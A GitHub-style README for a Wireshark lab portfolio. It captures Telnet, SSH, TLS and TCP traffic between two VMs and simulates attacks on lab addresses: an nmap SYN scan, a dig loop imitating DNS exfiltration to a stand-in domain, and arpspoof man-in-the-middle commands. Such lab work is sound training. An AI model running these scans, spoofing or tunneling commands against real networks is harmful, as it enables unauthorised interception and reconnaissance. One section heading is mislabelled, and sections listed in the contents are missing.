<h1 = align=center>𝚆𝙸𝚁𝙴𝚂𝙷𝙰𝚁𝙺 𝙿𝙰𝙲𝙺𝙴𝚃 𝙰𝙽𝙰𝙻𝚈𝚂𝙸𝚂</h1>

<p = align=center>
<img width="1472" height="783" alt="Wireshark Final drawio" src="https://github.com/user-attachments/assets/be13648a-329a-46b7-b929-dc9503284816" />
</p>

## 🛠️ TECHNOLOGY & PLATFORMS UTILIZED

- [`Wireshark:`](https://www.wireshark.org/download.html)</br>
  Core tool used for capturing and analyzing network traffic across various protocols.

- [`VirtualBox:`](https://www.virtualbox.org/)</br>
  Hosted multiple isolated virtual machines for safely simulating real-world networking environments and security attacks.

- [`Ubuntu 22.04:`](https://releases.ubuntu.com/jammy/)</br>
  Deployed on two separate virtual machines—one configured as the attacker/client and the other as the server/analyzer.

---

## OBJECTIVE

This project involved the design and execution of a comprehensive series of network security simulations using `Wireshark` in a controlled virtual lab environment. Leveraging `VirtualBox` and multiple `Linux` virtual machines, I captured and analyzed network traffic across a variety of protocols to simulate both normal and malicious behavior. Key scenarios included `TCP handshakes`, `SYN scans`, `DNS tunneling`, `ARP spoofing`, `credential leakage` via HTTP and FTP, `Telnet/SSH` sessions, `TLS/SSL handshakes`, and `DoS/DDoS` indicators. Each simulation was crafted to mirror real-world attack patterns or defensive monitoring tasks, providing deep insights into packet-level behavior, protocol vulnerabilities, and network-based threat detection techniques. This project demonstrated hands-on proficiency in packet analysis, threat simulation, and network forensic workflows.

---

## 📜 TABLE OF CONTENTS

- [`TELNET TRAFFIC`](TELNET-TRAFFIC)
- [`SSH TRAFFIC`](SSH-TRAFFIC)
- [`TLS/SSL HANDSHAKE`](tlsssl-handshake)
- [`TCP 3-WAY HANDSHAKE`](tcp-3-way-handshake)
- [`DNS TUNNELING`](dns-tunneling)
- [`ARP SPOOFING & MAN-IN-THE-MIDDLE ATTACK`](arp-spoofing--man-in-the-middle-attack)
- [`CREDENTIAL LEAKAGE`](credential-leakage)
- [`DOS/DDOS ATTACK SIMULATION`](dosddos-attack-simulation)

---

<img width="1340" height="120" alt="telnet drawio (1)" src="https://github.com/user-attachments/assets/0cdb9c57-472a-4f01-a4e1-3496894d7533" />

## TELNET TRAFFIC

### Step 1: Set Up the `Telnet Server` (VM 2)

- ### Update package list:
```bash
sudo apt update
```
- ### Install Telnet server (telnetd):
```bash
sudo apt install telnetd
```
- ### Start the Telnet service:
```bash
sudo systemctl start inetd
```
- ### Confirm that Telnet is listening on port 23:
```bash
sudo netstat -tuln | grep :23
```

<img width="717" height="54" alt="image" src="https://github.com/user-attachments/assets/287643b2-218f-4888-9c4f-3327ef279151" />

### *Start `Wireshark` and begin capturing on `enp0s3`.*

---

### Step 2: Set up the `Telnet Client` (VM 1) 

- ### Install the Telnet Client:
```bash
sudo apt install telnet
```

- ### Connect to the Telnet server using its IP address:
```bash
telnet 10.10.10.50
```

<img width="617" height="415" alt="Lab 52" src="https://github.com/user-attachments/assets/b2c8d8fd-3857-4cfa-b41e-28386c5171eb" /></br>

- ### Once connected, run commands to generate traffic:
```bash
whoami
uname -a
ls -la
uptime
```

<img width="726" height="559" alt="Lab 59" src="https://github.com/user-attachments/assets/2652131c-4977-4180-9871-cc4b0463c7ff" />

---

### Step 3: Analyze Telnet Traffic in `Wireshark`

- ### Apply the display filter: `telnet` or `tcp.port == 23`

<img width="1425" height="646" alt="Lab 54 Crop" src="https://github.com/user-attachments/assets/30604382-6420-43aa-86ae-cbd85cc6697c" /></br>

The Telnet session captured in Wireshark demonstrates the inherent insecurity of the protocol, which transmits data entirely in plaintext over TCP port 23. During the session, we observed the full login exchange between the client and server, including the `Ubuntu login:` prompt followed by the username `test` and the password `9000`, all visible without encryption. Subsequent commands such as `whoami`, `uname -a`, `ls -la`, and `uptime` were also captured in clear text, along with their corresponding responses. This analysis clearly highlights how Telnet traffic can be easily intercepted and read by anyone with access to the network, reinforcing why Telnet is considered insecure and has been replaced in modern systems by encrypted alternatives like SSH.

<img width="863" height="489" alt="Lab 55" src="https://github.com/user-attachments/assets/a438edd4-b14d-4fc6-9353-d354d4e0c40f" />

---
</br>
<img width="1340" height="120" alt="ssh drawio (1)" src="https://github.com/user-attachments/assets/5462b9be-b3c6-4b7a-b890-54779ccd3e43" />

## SSH TRAFFIC

### Step 1: Configure the SSH Server (VM 2)

- ### On the server VM, install and verify the SSH service:
```bash
sudo apt update
sudo apt install openssh-server
sudo systemctl status ssh
```

<img width="725" height="289" alt="Lab 57" src="https://github.com/user-attachments/assets/d0c89cb6-5067-41f9-b534-057d1ea4392b" />

### *Start `Wireshark` and begin capturing on `enp0s3`.*

---

### Step 2: Connect the SSH Client (VM 1)

- ### On the client VM, initiate an SSH session to the server:
```bash
ssh test@10.10.10.50
```

<img width="731" height="446" alt="Lab 58" src="https://github.com/user-attachments/assets/e5e7fd90-0ce0-4ba9-861a-c02013bc4f04" /></br>

- ### While connected, execute commands to generate traffic:
```bash
whoami
uname -a
ls -la
uptime
```

<img width="726" height="559" alt="Lab 59" src="https://github.com/user-attachments/assets/98bb9cd3-c20a-4816-9aae-a94cd1ea563a" />

---

### Step 3: Analyze SSH Traffic in `Wireshark`

- ### Apply the display filter: `tcp.port == 22`

<img width="1454" height="596" alt="Lab 60" src="https://github.com/user-attachments/assets/4ba492fe-01f1-4365-a540-f6c1f27c75e1" /></br>

When reviewing the SSH session in Wireshark, we observed that all communication between the client and server was encrypted. Unlike `Telnet`, which transmits data (including usernames and passwords) in plaintext, `SSH` encapsulates all authentication and session data within encrypted packets, making it unreadable to observers. In the capture, the initial handshake involves key exchange and algorithm negotiation, followed by encrypted `TCP` segments on `port 22`. Even commands like `whoami` or `ls -la` and their responses are not visible in plaintext, showcasing SSH's effectiveness in providing secure remote access and protecting against eavesdropping.

---

<img width="1340" height="120" alt="tls drawio" src="https://github.com/user-attachments/assets/cd918ab4-1bfd-4ff4-9f87-feac85a9e472" />

## TLS/SSL HANDSHAKE

### Step 1: Configure the TLS Server (VM 2)

- ### Install Apache and OpenSSL on the `Server VM`:
```bash
sudo apt update
sudo apt install apache2 openssl -y
```

- ### Enable SSL support and generate a self-signed TLS certification:
```bash
sudo a2enmod ssl
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/ssl/private/apache-selfsigned.key \
  -out /etc/ssl/certs/apache-selfsigned.crt
```

- ### Create and apply a basic HTTPS configuration for Apache:
```bash
sudo nano /etc/apache2/sites-available/default-ssl.conf
```

- ### Enable the SSL Site and restart Apache:
```bash
sudo a2ensite default-ssl
sudo systemctl restart apache2
```

<img width="556" height="147" alt="Lab 41" src="https://github.com/user-attachments/assets/80fd51dd-03cd-411d-bafe-d0ecc3519b32" /></br>

### *At the point, the server was configured to accept HTTPS connections on port 443. Start `Wireshark` and begin capturing on `enp0s3`.*

---

### Step 2: Initiate a TLS Handshake from the Client

- ### On the `Client VM`, trigger a handshake using `curl`:
```bash
curl -k https://10.10.10.50
```

<img width="725" height="605" alt="Lab 42" src="https://github.com/user-attachments/assets/ff87955b-535b-4ce3-ba86-dc63af27d66a" />

---

### Step 3: Analyze the TLS/SSL Handshake in Wireshark

- ### Apply the display filter: `tls`

<img width="1423" height="1131" alt="Lab 46" src="https://github.com/user-attachments/assets/2053c5ce-bd47-4188-9abc-b8c60fe8088f" /></br>

<img width="1423" height="660" alt="Lab 45" src="https://github.com/user-attachments/assets/4b30b847-c0dd-49fc-9a13-eb6388573765" /></br>

In our TLS/SSL handshake capture, we successfully observed the full negotiation process between the client and server. The session began with the `Client Hello` message, in which the client proposed `28` different `cipher suites`, indicating its supported encryption algorithms and TLS extensions. This was followed by the `Server Hello`, where the server selected the most compatible `cipher suite` and returned its SSL configuration details. Most notably, we captured the `Handshake Protocol: Certificate` message, which contained the server’s `X.509 certificate`, including the issuer, subject name, validity dates, and public key. The presence of these packets confirmed a complete and properly structured TLS handshake. This analysis helped illustrate how secure HTTPS communication is initialized and the role of certificates in establishing trust.

---

<img width="1340" height="120" alt="tcp 3-way drawio" src="https://github.com/user-attachments/assets/e2d6b881-439e-48e1-9ed8-c2259e661019" />

## TCP 3-WAY HANDSHAKE

### Step 1: Install the Required Tools

- ### On both the `Client VM` and `Server VM`, install the necessary networking utilities:
```bash
sudo apt update
sudo apt install netcat iputils-ping
```

- ### For SYN scan testing, install `nmap` on the `Client VM`:
```bash
sudo apt install nmap
```

### *Start `Wireshark` and begin capturing on `enp0s3`.*

---

### Step 2: Simulate a Normal TCP 3-Way Handshake

- ### On the `Server VM`, start a TCP listener on `port 1234` using `netcat`:
```bash
nc -l -p 1234
```

- ### On the `Client VM`, connect to the server's open port:
```bash
nc 10.10.10.50 1234
```

---

### Step 3: Simulate Abnormal Behavior (SYN Scan)

- ### From the `Client VM`, perform a `stealth SYN` scan targeting `port 1234` on the server:
```bash
nmap -sS -p 1234 10.10.10.50
```

---

### Step 4: Analyze the `TCP 3-Way Handshake` and `SYN Scan` in Wireshark

- ### Apply the display filter: `tcp.port == 1234`

<img width="1423" height="203" alt="Lab 24" src="https://github.com/user-attachments/assets/d4b96623-db7b-491d-9237-ff689a0a6044" /></br>

During the normal TCP 3-way handshake test, we observed the expected packet exchange pattern: the `client initiated a connection with a SYN packet`, the `server responded with SYN-ACK`, and the `client completed the handshake with an ACK`. This sequence confirms a fully established TCP session on `port 1234`, visible in Wireshark using the `tcp.port == 1234` filter.

<img width="1204" height="55" alt="Lab 25" src="https://github.com/user-attachments/assets/2d5d6405-8cae-48f1-8457-1a370978650d" /></br>

In contrast, the SYN scan test using `nmap -sS` demonstrated a half-open connection. The `client sent a SYN`, the `server replied with SYN-ACK`, but instead of completing the handshake, the `client responded with an immediate RST`. This is characteristic of stealth scanning techniques often used by attackers to detect open ports without fully establishing a connection.

---

<img width="1340" height="120" alt="dns drawio" src="https://github.com/user-attachments/assets/0602dc8a-ca47-44ac-b374-2b1f033b2a2d" />

## DNS TUNNELING

### Step 1: Set up the `Client VM`

- ### Install `dig` (DNS query tool):
```bash
sudo apt install dnsutils -y
```

### *Start `Wireshark` and begin capturing on `enp0s3`.*

---

### Step 2: Simulate DNS-based Data Exfiltration
- ### Run the following script to simulate tunneling via randomized subdomains:
```bash
for i in {1..30}; do
   dig $(head /dev/urandom | tr -dc A-Za-z0-9 | head -c20).stealthy-domain.com @10.10.10.50
done
```

<img width="729" height="277" alt="Lab 38" src="https://github.com/user-attachments/assets/dd57a1e1-e1c5-4d5b-905a-1889c3f90ad6" />

---

### Step 3: Analyze the `DNS Tunneling` in Wireshark

- ### Apply the display filter: `dns`

<img width="1423" height="627" alt="Lab 40" src="https://github.com/user-attachments/assets/34dd9ab5-aa2d-4a8e-b8be-2a55667f456d" /></br>

During the simulation, Wireshark captured multiple DNS query packets originating from the attacker VM directed to `stealthy-domain.com`, demonstrating the encoded subdomain requests typical of DNS tunneling or data exfiltration attempts. These queries contained randomized alphanumeric strings in the subdomain portion, mimicking how sensitive data might be covertly encoded within DNS requests. Shortly after these DNS packets, `ICMP “Destination Unreachable”` messages were observed repeatedly—five times in quick succession—indicating that the DNS server or network device did not recognize or could not route the queried domain. This pattern is consistent with an attacker attempting to exfiltrate data via DNS, while the network or target system rejects or fails to resolve these crafted requests, potentially signaling an attempted stealthy communication or misconfiguration in the simulated environment.

---

## ARP SPOOFING & MAN-IN-THE-MIDDLE ATTACK

### Step 1: Set Up the `Client VM`

- ### Install the `dsniff` package:
```bash
sudo apt update
sudo apt install dsniff -y
```

### *Start `Wireshark` and begin capturing on `enp0s3`.*

---

### Step 2: Start the ARP Spoofing:

```bash
sudo arpspoof -i enp0s3 -t 10.10.10.100 10.10.10.50
```

```bash
sudo arpspoof -i enp0s3 -t 10.10.10.50 10.10.10.100
```

-### Display the current ARP table with `arp -n`:

<img width="723" height="182" alt="Lab 48" src="https://github.com/user-attachments/assets/50fe0e47-7049-4dcb-b1fa-cc6870792245" />

### *The current ARP table shows that the `Server VM` associates the IP `10.10.10.100` (the sender) with the attacker's MAC address `08:00:27:a4:29:a6`.*

---

### Step 3: Analyze the `DNS Tunneling` in Wireshark

- ### Apply the display filter: `arp`

<img width="1068" height="887" alt="Lab 47" src="https://github.com/user-attachments/assets/a19037e5-831b-4efe-8d28-40819f4a32df" />

The ARP spoofing was successful because the victim’s ARP cache was tricked into associating the attacker’s MAC address with the IP address `10.10.10.100`. This allows the attacker to intercept or alter network traffic between the victim and the legitimate sender, effectively enabling a `man-in-the-middle` (MITM) attack.

---




















































